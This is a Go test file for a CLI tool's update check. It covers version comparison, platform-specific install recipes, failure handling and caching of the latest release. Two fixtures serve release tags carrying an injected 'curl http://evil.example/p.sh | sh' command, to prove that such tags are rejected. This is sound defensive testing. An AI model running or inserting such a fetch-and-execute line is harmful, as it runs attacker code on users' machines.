package release

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// errOffline is a transport failure with no server on the other end; errTimeout
// is one that timed out. They are distinct because the milestone names them
// separately, and identical in outcome because both mean "could not tell".
type errOffline struct{}

func (errOffline) Error() string { return "dial tcp: no such host" }

type errTimeout struct{}

func (errTimeout) Error() string   { return "context deadline exceeded" }
func (errTimeout) Timeout() bool   { return true }
func (errTimeout) Temporary() bool { return true }

// answering serves one canned reply to every request and counts how many it
// was asked for. The network is injected, so no test here reaches a live
// service and no verdict depends on which machine ran it (ADR-042).
type answering struct {
	status int
	body   string
	err    error
	calls  int
}

func (a *answering) RoundTrip(r *http.Request) (*http.Response, error) {
	a.calls++
	if a.err != nil {
		return nil, a.err
	}
	return &http.Response{
		StatusCode: a.status,
		Body:       io.NopCloser(strings.NewReader(a.body)),
		Header:     make(http.Header),
		Request:    r,
	}, nil
}

func serving(status int, body string) *answering {
	return &answering{status: status, body: body}
}

func failing(err error) *answering { return &answering{err: err} }

func (a *answering) client() *http.Client { return &http.Client{Transport: a} }

// TestAC075_UnitPositive_EachPlatformGetsItsOwnRoute proves the branch the
// milestone names: the machine decides which single recipe is printed.
func TestAC075_UnitPositive_EachPlatformGetsItsOwnRoute(t *testing.T) {
	cases := []struct {
		platform Platform
		want     string
	}{
		{Platform{"windows", "amd64"}, "install.ps1"},
		{Platform{"windows", "arm64"}, "install.ps1"},
		{Platform{"darwin", "arm64"}, "install.sh"},
		{Platform{"linux", "amd64"}, "install.sh"},
		// No release publishes an asset for these, so the source route is the
		// only one that works — pinned to the release just reported.
		{Platform{"freebsd", "amd64"}, "go install github.com/cliewen/cliewen/cmd/clue@v0.12.0"},
		{Platform{"linux", "386"}, "go install github.com/cliewen/cliewen/cmd/clue@v0.12.0"},
	}
	for _, c := range cases {
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		got := Check(Options{
			Current:  "0.11.2",
			Platform: c.platform,
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Known || !got.Behind || got.Latest != "0.12.0" {
			t.Fatalf("%v: expected a known newer release, got %+v", c.platform, got)
		}
		if len(got.Recipe) != 1 {
			t.Fatalf("%v: expected exactly one route, got %v", c.platform, got.Recipe)
		}
		if !strings.Contains(got.Recipe[0], c.want) {
			t.Fatalf("%v: expected %q, got %q", c.platform, c.want, got.Recipe[0])
		}
		// The two routes this machine is not on must not appear at all: a
		// reader who has to skip past wrong lines is what the branch avoids.
		for _, wrong := range []string{"install.ps1", "install.sh", "go install"} {
			if wrong != c.want && !strings.Contains(c.want, wrong) && strings.Contains(got.Recipe[0], wrong) {
				t.Fatalf("%v: route names another platform's recipe: %q", c.platform, got.Recipe[0])
			}
		}
	}
}

// TestAC075_UnitNegative_ACurrentOrSourceBuildIsNotBehind holds the other
// direction: nothing to catch up with means no recipe to print.
func TestAC075_UnitNegative_ACurrentOrSourceBuildIsNotBehind(t *testing.T) {
	for _, current := range []string{"0.12.0", "0.13.0", "dev", ""} {
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		got := Check(Options{
			Current:  current,
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Known {
			t.Fatalf("%q: the release should still be known", current)
		}
		if got.Behind {
			t.Fatalf("%q: must not be reported behind %s", current, got.Latest)
		}
		if len(got.Recipe) != 0 {
			t.Fatalf("%q: expected no recipe, got %v", current, got.Recipe)
		}
	}
}

// TestAC077_UnitPositive_ACandidateIsBehindTheReleaseItNames holds the
// ordering rule: a pre-release carries the numbers of the release it is a
// candidate for, and the moment that release ships is exactly when its user
// needs to hear it. Comparing by numbers alone would call them equal and say
// nothing.
func TestAC077_UnitPositive_ACandidateIsBehindTheReleaseItNames(t *testing.T) {
	for _, current := range []string{"0.13.0-rc1", "0.13.0-alpha.2", "v0.13.0-rc1"} {
		net := serving(http.StatusOK, `{"tag_name":"v0.13.0"}`)
		got := Check(Options{
			Current:  current,
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Behind {
			t.Fatalf("%q: a candidate for 0.13.0 is behind 0.13.0, got %+v", current, got)
		}
		if got.Ahead {
			t.Fatalf("%q: a candidate for a published release is not ahead of it", current)
		}
		if len(got.Recipe) != 1 || !strings.Contains(got.Recipe[0], "install.sh") {
			t.Fatalf("%q: expected the route for this machine, got %v", current, got.Recipe)
		}
	}
}

// TestAC077_UnitNegative_BuildMetadataAndUnpublishedNumbersAreNotBehind holds
// the other side of the same rule. "+" is build metadata: it orders with the
// release it decorates, not before it. And a stamp whose numbers are newer
// than anything published is not behind — but it is not the newest release
// either, because the list never named it.
func TestAC077_UnitNegative_BuildMetadataAndUnpublishedNumbersAreNotBehind(t *testing.T) {
	cases := []struct {
		current    string
		tag        string
		wantAhead  bool
		wantReason string
	}{
		{"0.13.0+dirty", "v0.13.0", false, "build metadata orders with its release"},
		{"0.13.0+build.7", "v0.13.0", false, "build metadata orders with its release"},
		{"0.13.0", "v0.12.0", true, "newer numbers than anything published"},
		{"0.13.0-rc1", "v0.12.0", true, "a candidate for an unpublished release"},
	}
	for _, c := range cases {
		net := serving(http.StatusOK, `{"tag_name":"`+c.tag+`"}`)
		got := Check(Options{
			Current:  c.current,
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if got.Behind {
			t.Fatalf("%q vs %s: must not be behind (%s), got %+v", c.current, c.tag, c.wantReason, got)
		}
		if len(got.Recipe) != 0 {
			t.Fatalf("%q vs %s: nothing to catch up with, so no recipe: %v", c.current, c.tag, got.Recipe)
		}
		if got.Ahead != c.wantAhead {
			t.Fatalf("%q vs %s: Ahead = %v, want %v (%s)", c.current, c.tag, got.Ahead, c.wantAhead, c.wantReason)
		}
	}
}

// TestAC077_UnitPositive_EveryDegradationIsUnknown covers all four the
// milestone names. Each means "could not tell", and that is one answer.
func TestAC077_UnitPositive_EveryDegradationIsUnknown(t *testing.T) {
	cases := map[string]*answering{
		"offline":             failing(errOffline{}),
		"timeout":             failing(errTimeout{}),
		"rate limit":          serving(http.StatusForbidden, `{"message":"API rate limit exceeded"}`),
		"too many requests":   serving(http.StatusTooManyRequests, ``),
		"unrecognized body":   serving(http.StatusOK, `<html>maintenance</html>`),
		"unrecognized fields": serving(http.StatusOK, `{"name":"0.12.0"}`),
		"unparseable tag":     serving(http.StatusOK, `{"tag_name":"nightly"}`),
		// What this command prints is a command the user is told to run, so a
		// tag carrying anything but three numbers is not recognized at all.
		"tag carrying a command":     serving(http.StatusOK, `{"tag_name":"v0.12.0-x; curl http://evil.example/p.sh | sh"}`),
		"tag carrying a new line":    serving(http.StatusOK, "{\"tag_name\":\"v0.12.0\ncurl http://evil.example/p.sh | sh\"}"),
		"tag carrying a signed part": serving(http.StatusOK, `{"tag_name":"v0.+12.0"}`),
	}
	for name, net := range cases {
		got := Check(Options{
			Current:  "0.11.2",
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if got.Known {
			t.Fatalf("%s: expected an unknown answer, got %+v", name, got)
		}
		if got.Behind || len(got.Recipe) != 0 {
			t.Fatalf("%s: an unknown answer must claim nothing, got %+v", name, got)
		}
	}
}

// TestAC077_UnitNegative_AnUnknownAnswerIsNeverCachedAsAnAnswer keeps a failed
// request from silencing the next one: absence must never be stored as an
// answer. A failure is remembered under AC-088, which is a different fact kept
// under a different field — what may never happen is a stored tag nobody was
// given, and a check the user asked for must still ask.
func TestAC077_UnitNegative_AnUnknownAnswerIsNeverCachedAsAnAnswer(t *testing.T) {
	dir := t.TempDir()
	down := failing(errOffline{})
	if got := Check(Options{Current: "0.11.2", Client: down.client(), CacheDir: dir}); got.Known {
		t.Fatalf("expected unknown, got %+v", got)
	}
	assertNoTagCached(t, dir, "an offline request")
	// The other way an answer becomes unknown is a reply that arrived and was
	// not recognized. It must not be stored as an answer either — a cached tag
	// nothing can read would cost a request on every call and teach nothing.
	odd := serving(http.StatusOK, `{"tag_name":"nightly"}`)
	if got := Check(Options{Current: "0.11.2", Client: odd.client(), CacheDir: dir}); got.Known {
		t.Fatalf("expected unknown, got %+v", got)
	}
	assertNoTagCached(t, dir, "an unrecognized answer")
	up := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	if got := Check(Options{Current: "0.11.2", Client: up.client(), CacheDir: dir}); !got.Known {
		t.Fatalf("the next call must ask again, got %+v", got)
	}
}

// assertNoTagCached reads whatever the cache holds and insists it names no
// release. Reading the file rather than counting entries is the point: once a
// non-answer is remembered there, "nothing was written" no longer states the
// guarantee, and only the bytes can say whether a version was invented.
func assertNoTagCached(t *testing.T, dir, what string) {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(dir, "latest-release.json"))
	if err != nil {
		return // no cache at all is the strongest form of the same guarantee
	}
	var c cached
	if err := json.Unmarshal(data, &c); err != nil {
		t.Fatalf("%s left a cache file this package cannot read: %s", what, data)
	}
	if c.Tag != "" {
		t.Fatalf("%s was written to the cache as the tag %q", what, c.Tag)
	}
	if tag, state := readCache(dir, time.Now(), defaultTTL, defaultFailureTTL); state == cacheAnswer {
		t.Fatalf("%s reads back as the answer %q", what, tag)
	}
}

// TestAC077_UnitNegative_AnErrorStatusIsNotAnAnswer holds the guard the other
// degradation fixtures never reach: each of those carries a body that fails to
// parse anyway, so the status check itself is never what produces "could not
// tell". A rate limit, a proxy error page, or a mirror's error envelope can
// carry a perfectly well-formed tag, and reading it would let this command
// report a release the release list never gave.
func TestAC077_UnitNegative_AnErrorStatusIsNotAnAnswer(t *testing.T) {
	for _, status := range []int{
		http.StatusForbidden,
		http.StatusTooManyRequests,
		http.StatusNotFound,
		http.StatusInternalServerError,
	} {
		dir := t.TempDir()
		net := serving(status, `{"tag_name":"v9.9.9"}`)
		got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir})
		if got.Known {
			t.Fatalf("status %d: a well-formed tag on an error status is not an answer, got %+v", status, got)
		}
		if got.Behind || got.Latest != "" {
			t.Fatalf("status %d: nothing may be reported from it, got %+v", status, got)
		}
		assertNoTagCached(t, dir, fmt.Sprintf("a well-formed tag on status %d", status))
	}
}

// recording keeps the request itself, which every other round-tripper here
// answers without looking at. The address and the verb are the two things a
// user's machine cannot check for itself.
type recording struct {
	req *http.Request
}

func (r *recording) RoundTrip(req *http.Request) (*http.Response, error) {
	r.req = req
	return serving(http.StatusOK, `{"tag_name":"v0.12.0"}`).RoundTrip(req)
}

// TestSanity_TheRequestIsTheOneTheDesignDescribes pins what the shipped binary
// actually asks for. Every other test injects a transport that answers whatever
// it is handed, so the one constant deciding which release list is consulted —
// and the verb used to consult it — is invisible to all of them. A wrong path
// or a wrong method is a permanent, silent "could not tell", which is the exact
// failure this command exists to remove.
func TestSanity_TheRequestIsTheOneTheDesignDescribes(t *testing.T) {
	rec := &recording{}
	caller := &http.Client{Transport: rec}
	got := Check(Options{
		Current:  "0.11.2",
		Platform: Platform{"linux", "amd64"},
		Client:   caller,
		CacheDir: t.TempDir(),
	})
	// The budget is applied to a copy: a client is the caller's, and a check
	// that quietly stamped a timeout onto it would change every other request
	// that client is ever used for.
	if caller.Timeout != 0 {
		t.Errorf("the caller's client was modified: timeout is now %v", caller.Timeout)
	}
	if !got.Known {
		t.Fatalf("expected an answer, got %+v", got)
	}
	if rec.req == nil {
		t.Fatal("no request was made at all")
	}
	if rec.req.Method != http.MethodGet {
		t.Errorf("a release list is read, not written: method %s", rec.req.Method)
	}
	const want = "https://api.github.com/repos/cliewen/cliewen/releases/latest"
	if rec.req.URL.String() != want {
		t.Errorf("the check asks %s, but Cliewen publishes at %s", rec.req.URL, want)
	}
	if accept := rec.req.Header.Get("Accept"); accept != "application/vnd.github+json" {
		t.Errorf("the host is asked for its documented representation, got %q", accept)
	}
}

// TestAC077_UnitNegative_TheVersionIsRebuiltNotEchoed holds the line that makes
// "only numbers cross the boundary" true rather than merely intended. Every
// other fixture serves a canonical tag, where the string that was checked and
// the string that would be echoed are the same string — so the rebuild is
// invisible to all of them. A tag with a leading zero is the cheapest case
// where they differ, and it differs in the one place it matters: the printed
// recipe would name a tag that is not the release.
func TestAC077_UnitNegative_TheVersionIsRebuiltNotEchoed(t *testing.T) {
	for _, tag := range []string{"v0.012.0", "0.012.0", "v00.12.00"} {
		net := serving(http.StatusOK, `{"tag_name":"`+tag+`"}`)
		got := Check(Options{
			Current:  "0.11.2",
			Platform: Platform{"freebsd", "amd64"}, // the route that carries the version
			Client:   net.client(),
			CacheDir: t.TempDir(),
		})
		if !got.Known {
			t.Fatalf("%q: three numbers is three numbers, got %+v", tag, got)
		}
		if got.Latest != "0.12.0" {
			t.Fatalf("%q: expected the version rebuilt from its numbers, got %q", tag, got.Latest)
		}
		if len(got.Recipe) != 1 || !strings.Contains(got.Recipe[0], "@v0.12.0") {
			t.Fatalf("%q: the recipe must name the release, not the response: %v", tag, got.Recipe)
		}
	}
}

// TestAC077_UnitNegative_AnUnboundedBodyIsNotRead holds the bound the package
// comment states. This runs at every session start, so a host that answers with
// something enormous must cost a bounded read and then mean "could not tell"
// like every other unrecognized answer.
func TestAC077_UnitNegative_AnUnboundedBodyIsNotRead(t *testing.T) {
	// Well-formed JSON carrying the right field, and far past the bound: only
	// the limit can be what refuses it.
	huge := `{"padding":"` + strings.Repeat("x", 2<<20) + `","tag_name":"v0.12.0"}`
	net := serving(http.StatusOK, huge)
	got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: t.TempDir()})
	if got.Known {
		t.Fatalf("a body past the bound is not an answer, got %+v", got)
	}
}

// TestAC078_UnitNegative_TheLifetimeIsTheOneDocumented pins the boundary itself.
// Every carrier says a day; a cache that quietly stood for two would report a
// release that shipped yesterday as the newest one.
func TestAC078_UnitNegative_TheLifetimeIsTheOneDocumented(t *testing.T) {
	cases := []struct {
		age       time.Duration
		wantFresh bool
	}{
		{23 * time.Hour, true},
		{24*time.Hour - time.Minute, true},
		{24 * time.Hour, false}, // the boundary belongs to the stale side
		{25 * time.Hour, false},
	}
	for _, c := range cases {
		dir := t.TempDir()
		now := time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)
		writeCache(dir, cached{Tag: "v0.12.0", Fetched: now.Add(-c.age)})
		net := serving(http.StatusOK, `{"tag_name":"v0.13.0"}`)
		got := Check(Options{
			Current:  "0.11.2",
			Client:   net.client(),
			CacheDir: dir,
			Now:      func() time.Time { return now },
		})
		fresh := net.calls == 0
		if fresh != c.wantFresh {
			t.Errorf("age %v: cache used = %v, want %v (answer %s)", c.age, fresh, c.wantFresh, got.Latest)
		}
	}
}

// TestAC078_UnitPositive_AFreshCacheCostsNoRequest is what makes running this
// at every session start acceptable to the host as well as to the user.
func TestAC078_UnitPositive_AFreshCacheCostsNoRequest(t *testing.T) {
	dir := t.TempDir()
	now := time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)
	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)

	first := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir, Now: func() time.Time { return now }})
	if !first.Known || net.calls != 1 {
		t.Fatalf("expected one request and a known answer, got %+v after %d call(s)", first, net.calls)
	}
	// The cache is a file in the given directory, and nothing else was written.
	path := filepath.Join(dir, "latest-release.json")
	data, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("expected the answer cached at %s: %v", path, err)
	}
	var stored cached
	if err := json.Unmarshal(data, &stored); err != nil || stored.Tag != "v0.12.0" {
		t.Fatalf("unexpected cache contents %q (%v)", data, err)
	}

	later := now.Add(23 * time.Hour)
	second := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir, Now: func() time.Time { return later }})
	if net.calls != 1 {
		t.Fatalf("a fresh cache must cost no request, got %d call(s)", net.calls)
	}
	if !second.Known || second.Latest != "0.12.0" {
		t.Fatalf("expected the cached answer, got %+v", second)
	}
}

// redirectUserCacheDir points os.UserCacheDir at a temporary directory, per
// platform, so the default path can be exercised without writing into the real
// one. Without this the default branch is never executed by any test, and the
// clause it implements — never inside the repository — would survive being
// changed to a relative path.
func redirectUserCacheDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	switch runtime.GOOS {
	case "windows":
		t.Setenv("LocalAppData", dir)
	case "darwin":
		t.Setenv("HOME", dir)
		dir = filepath.Join(dir, "Library", "Caches")
	default:
		t.Setenv("XDG_CACHE_HOME", dir)
	}
	return dir
}

// TestAC078_UnitPositive_TheDefaultCacheIsOutsideTheRepository executes the
// path a real run takes: no cache directory given, and the working directory
// is a repository that must be left untouched.
func TestAC078_UnitPositive_TheDefaultCacheIsOutsideTheRepository(t *testing.T) {
	cacheRoot := redirectUserCacheDir(t)
	repo := t.TempDir()
	t.Chdir(repo)

	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	got := Check(Options{Current: "0.11.2", Platform: Platform{"linux", "amd64"}, Client: net.client()})
	if !got.Known || !got.Behind {
		t.Fatalf("expected a known newer release, got %+v", got)
	}

	want := filepath.Join(cacheRoot, "cliewen", "latest-release.json")
	if _, err := os.Stat(want); err != nil {
		t.Fatalf("expected the answer cached at %s: %v", want, err)
	}
	entries, err := os.ReadDir(repo)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Fatalf("the cache was written into the working repository: %v", entries)
	}
}

// TestAC078_UnitNegative_StaleAndBrokenCachesAreAbsence proves the three ways
// a cache stops counting. None of them is an error: a cache that can fail a
// command is worse than no cache.
func TestAC078_UnitNegative_StaleAndBrokenCachesAreAbsence(t *testing.T) {
	now := time.Date(2026, 8, 2, 12, 0, 0, 0, time.UTC)
	cases := map[string]string{
		"stale":           `{"tag":"v0.9.0","fetched":"2026-07-01T12:00:00Z"}`,
		"unreadable":      "\x00 not json at all",
		"nonsense":        `{"tag":"nightly","fetched":"2026-08-02T11:00:00Z"}`,
		"from the future": `{"tag":"v0.9.0","fetched":"2027-01-01T00:00:00Z"}`,
	}
	for name, contents := range cases {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "latest-release.json"), []byte(contents), 0o644); err != nil {
			t.Fatal(err)
		}
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: dir, Now: func() time.Time { return now }})
		if net.calls != 1 {
			t.Fatalf("%s: expected the host to be asked, got %d call(s)", name, net.calls)
		}
		if !got.Known || got.Latest != "0.12.0" {
			t.Fatalf("%s: expected the fresh answer, got %+v", name, got)
		}
	}

	// A cache directory that cannot be written is absence too: the answer is
	// already in hand, so the only cost is asking again next time.
	blocked := filepath.Join(t.TempDir(), "file-where-a-directory-should-be")
	if err := os.WriteFile(blocked, []byte("not a directory"), 0o644); err != nil {
		t.Fatal(err)
	}
	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	got := Check(Options{Current: "0.11.2", Client: net.client(), CacheDir: filepath.Join(blocked, "cliewen")})
	if !got.Known || !got.Behind {
		t.Fatalf("an unwritable cache must not affect the answer, got %+v", got)
	}
}

// TestAC088_UnitPositive_AnOfflineSessionPaysForTheNonAnswerOnce is the whole
// point of remembering a failure. Before it, only a successful fetch was
// stored, so an offline or blackholed session paid the ambient budget again at
// every workflow command — five commands, five waits, one unchanging
// non-answer — and the promise that a cached answer makes repeating this free
// held only when the release list actually answered.
func TestAC088_UnitPositive_AnOfflineSessionPaysForTheNonAnswerOnce(t *testing.T) {
	// "Does not answer" is the whole set AC-077 already treats as one outcome,
	// not transport failure alone. A rate limit is the case the hour is sized
	// for and it arrives as a reply, so a remembering path that covered only a
	// dead socket would leave the expensive case paying per command.
	for name, net := range map[string]*answering{
		"offline":              failing(errOffline{}),
		"timeout":              failing(errTimeout{}),
		"rate limit":           serving(http.StatusForbidden, `{"message":"API rate limit exceeded"}`),
		"server error":         serving(http.StatusInternalServerError, ``),
		"an unrecognized body": serving(http.StatusOK, `<html>maintenance</html>`),
		"a tag nothing reads":  serving(http.StatusOK, `{"tag_name":"nightly"}`),
	} {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			now := time.Date(2026, 8, 4, 9, 0, 0, 0, time.UTC)

			// One session's worth of ordinary work, each command carrying the notice.
			for i, at := range []time.Duration{0, time.Minute, 12 * time.Minute, 30 * time.Minute, 59 * time.Minute} {
				when := now.Add(at)
				line := Notice(Options{
					Current:  "0.11.2",
					Platform: Platform{"linux", "amd64"},
					Client:   net.client(),
					CacheDir: dir,
					Now:      func() time.Time { return when },
				})
				if line != "" {
					t.Fatalf("command %d: a check that could not answer must stay silent, got %q", i, line)
				}
			}
			if net.calls != 1 {
				t.Fatalf("the same non-answer was paid for %d times, want 1", net.calls)
			}
			// It is remembered as a non-answer and never as a version.
			assertNoTagCached(t, dir, name)
		})
	}
}

// TestAC088_UnitNegative_TheRememberedFailureExpiresOnItsOwnShortSchedule
// bounds the other side: a non-answer is a fact about a moment, so it must not
// inherit an answer's day. The boundary belongs to the expired side, matching
// the answer's lifetime rule.
func TestAC088_UnitNegative_TheRememberedFailureExpiresOnItsOwnShortSchedule(t *testing.T) {
	cases := []struct {
		age            time.Duration
		wantRemembered bool
	}{
		{time.Minute, true},
		{59 * time.Minute, true},
		{time.Hour, false}, // the boundary belongs to the expired side
		{90 * time.Minute, false},
		{23 * time.Hour, false}, // an answer would still be fresh here; this is not an answer
	}
	for _, c := range cases {
		dir := t.TempDir()
		now := time.Date(2026, 8, 4, 12, 0, 0, 0, time.UTC)
		writeCache(dir, cached{Unanswered: true, Fetched: now.Add(-c.age)})
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		line := Notice(Options{
			Current:  "0.11.2",
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: dir,
			Now:      func() time.Time { return now },
		})
		remembered := net.calls == 0
		if remembered != c.wantRemembered {
			t.Errorf("age %v: remembered = %v, want %v", c.age, remembered, c.wantRemembered)
		}
		if remembered && line != "" {
			t.Errorf("age %v: a remembered non-answer must say nothing, got %q", c.age, line)
		}
		if !remembered && line == "" {
			t.Errorf("age %v: once it has expired the notice must come back", c.age)
		}
	}
}

// TestAC088_UnitNegative_ACheckTheUserAskedForAlwaysAsks is the line the
// remembering may not cross. Silence bought by not asking is only acceptable
// for a check nobody wanted; the person most likely to have just fixed the
// network is the one typing "clue latest", and answering them from a
// ten-minute-old failure would make the fix look like it had not worked.
func TestAC088_UnitNegative_ACheckTheUserAskedForAlwaysAsks(t *testing.T) {
	dir := t.TempDir()
	now := time.Date(2026, 8, 4, 12, 0, 0, 0, time.UTC)
	writeCache(dir, cached{Unanswered: true, Fetched: now.Add(-10 * time.Minute)})

	net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
	got := Check(Options{
		Current:  "0.11.2",
		Platform: Platform{"linux", "amd64"},
		Client:   net.client(),
		CacheDir: dir,
		Now:      func() time.Time { return now },
	})
	if net.calls != 1 {
		t.Fatalf("a requested check must ask, got %d call(s)", net.calls)
	}
	if !got.Known || !got.Behind || got.Latest != "0.12.0" {
		t.Fatalf("expected the fresh answer, got %+v", got)
	}
	// And what it learned replaces the remembered failure rather than sitting
	// beside it, so the next ambient check reports rather than stays silent.
	line := Notice(Options{
		Current:  "0.11.2",
		Platform: Platform{"linux", "amd64"},
		Client:   failing(errOffline{}).client(),
		CacheDir: dir,
		Now:      func() time.Time { return now.Add(time.Minute) },
	})
	if line == "" {
		t.Fatal("the answer the user's own check fetched must reach the next notice")
	}
}

// TestAC088_UnitNegative_ARememberedFailureIsNeverAnAnswerAndACorruptCacheIsNeverAFailure
// holds both directions of the distinction the stored field exists to make.
// A remembered non-answer must never turn into a report, and a file that
// cannot be read — or contradicts itself by carrying a tag and a failure at
// once — must stay absence rather than silence a request, which is ADR-042's
// rule about an unreadable cache, unchanged by this file gaining a second
// thing to say.
func TestAC088_UnitNegative_ARememberedFailureIsNeverAnAnswerAndACorruptCacheIsNeverAFailure(t *testing.T) {
	now := time.Date(2026, 8, 4, 12, 0, 0, 0, time.UTC)

	dir := t.TempDir()
	writeCache(dir, cached{Unanswered: true, Fetched: now.Add(-time.Minute)})
	got := Check(Options{
		Current:  "0.11.2",
		Client:   failing(errOffline{}).client(),
		CacheDir: dir,
		Unasked:  true,
		Now:      func() time.Time { return now },
	})
	if got.Known || got.Behind || got.Latest != "" || len(got.Recipe) != 0 {
		t.Fatalf("a remembered non-answer must claim nothing, got %+v", got)
	}

	// Every shape that is not a clean, current, self-consistent failure record
	// must send the check back to the host.
	cases := map[string]string{
		"truncated":             `{"unanswered":tru`,
		"empty":                 ``,
		"not an object":         `"unanswered"`,
		"a tag and a failure":   `{"tag":"v0.9.0","unanswered":true,"fetched":"2026-08-04T11:59:00Z"}`,
		"stamped in the future": `{"unanswered":true,"fetched":"2027-01-01T00:00:00Z"}`,
		"expired":               `{"unanswered":true,"fetched":"2026-08-04T09:00:00Z"}`,
	}
	for name, contents := range cases {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "latest-release.json"), []byte(contents), 0o644); err != nil {
			t.Fatal(err)
		}
		net := serving(http.StatusOK, `{"tag_name":"v0.12.0"}`)
		line := Notice(Options{
			Current:  "0.11.2",
			Platform: Platform{"linux", "amd64"},
			Client:   net.client(),
			CacheDir: dir,
			Now:      func() time.Time { return now },
		})
		if net.calls != 1 {
			t.Errorf("%s: expected the host to be asked, got %d call(s)", name, net.calls)
		}
		if line == "" {
			t.Errorf("%s: expected the fresh answer to produce a notice", name)
		}
	}
}
